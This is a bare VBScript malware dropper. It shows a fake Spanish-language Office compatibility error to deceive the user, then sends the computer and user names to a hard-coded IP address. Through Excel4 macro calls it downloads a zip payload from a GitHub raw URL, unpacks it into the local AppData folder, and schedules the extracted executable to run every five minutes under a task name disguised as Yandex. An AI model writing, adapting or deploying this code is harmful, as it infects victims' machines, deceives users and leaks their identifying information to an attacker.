Set shellObj = CreateObject("WScript.Shell")
set objShell = CreateObject("Shell.Application")
call shellObj.PoPup ("La version de este documento no es compatible con la version de Microsoft Office que esta ejecutando su computadora. Compruebe la informacion del sistema operativo para comprobar si nesesita una version x86 (32 bits) o x64 (64 bits).", -1, "Error", 16)
Set EnvVar = shellObj.Environment("PROCESS")
ComputerName = EnvVar("COMPUTERNAME") + "_" + EnvVar("USERNAME")

Set ListData = CreateObject("MSXML2.ServerXMLHTTP")
call ListData.Open("GET", "http://192.168.100.40/user/status?stage=1&username=" + ComputerName, False)
call ListData.send

Set excelObj = CreateObject("Excel.ChartApplication")
excelObj.visible = false
AppdataDirectory = EnvVar("LOCALAPPDATA")
FilePath = AppdataDirectory + "\additional.zip"
UrlPath = "https://raw.githubusercontent.com/horacio1818/hello-world/main/v/additional.zip"
call excelObj.ExecuteExcel4Macro("CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"", 0, """+UrlPath+""", """+FilePath+""", 0, 0)")
set FilesInZip=objShell.NameSpace(FilePath).items
objShell.NameSpace(AppdataDirectory).CopyHere(FilesInZip)
Commandline = "/Create /SC DAILY /TN YandexE84AC6E2495D /ST 00:30 /du 24:00 /RI 5 /F /TR %LOCALAPPDATA%\zCrashReport64.exe"
call excelObj.ExecuteExcel4Macro("CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"", 0,""open"",""C:\Windows\System32\schtasks.exe"","""+Commandline+""",0,5)")

call ListData.Open("GET", "http://192.168.100.40/user/status?stage=2&username=" + ComputerName, False)
call ListData.send
